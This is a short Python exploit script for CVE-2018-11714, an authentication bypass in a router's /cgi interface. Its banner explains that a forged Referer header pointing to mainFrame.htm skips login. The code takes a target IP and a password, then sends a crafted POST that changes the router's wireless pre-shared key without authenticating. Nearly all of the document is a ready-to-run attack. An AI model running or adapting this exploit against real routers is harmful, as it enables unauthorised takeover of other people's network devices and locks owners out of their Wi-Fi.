import requests
import sys
import os
import time
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                              CVE-2018-11714                                |
|                                                                            |
| This issue is caused by improper session handling on /cgi/ Folder or /cgi  |
| file found by Touhid Shaikh(BlackFog Team Member).                         |
|                                                                            |
| if any attacker sends Referer Header with its request and sets Referer:    |
| http://192.168.0.1/mainFrame.htm dan its no authentication required and an |
| attacker can do router's action without authentication.                    |
| below are some of few examples you can see. But the attacker can do mostly |
| all of the action on a router without Authentication.	                     |
 -----------------------------------------------------------------------------
"""

if len(sys.argv) is not 3:
	print(decription)
	print(Fore.YELLOW+"[-] Example: python cve-2018-11714.py <Target IP> <PASSWORD>"+Fore.RESET)
	sys.exit()

target=sys.argv[1]
passwd=sys.argv[2]
if len(passwd) < 8:
	print(decription)
	print(Fore.YELLOW+"[-] Password must be at least 8 characters"+Fore.RESET)
	sys.exit()
s=requests.Session()

print(decription)
print Fore.YELLOW+"[*] Attack on "+target+Fore.RESET
print Fore.YELLOW+"[+] Sending the payload Password '"+passwd+"' Setting"+Fore.RESET
r=s.post('http://'+target+'/cgi',params={'2': '',},headers={'User-Agent': 'Agent22','Accept-Encoding': 'gzip, deflate','Content-Type': 'text/plain','Referer': 'http://'+target+'/mainFrame.htm','Content-Length': '199','Connection': 'close',}, data='[LAN_WLAN#1,1,0,0,0,0#0,0,0,0,0,0]0,5\r\nBeaconType=11i\r\nIEEE11iAuthenticationMode=PSKAuthentication\r\nIEEE11iEncryptionModes=AESEncryption\r\nX_TP_PreSharedKey='+passwd+'\r\nX_TP_GroupKeyUpdateInterval=0\r\n',
)
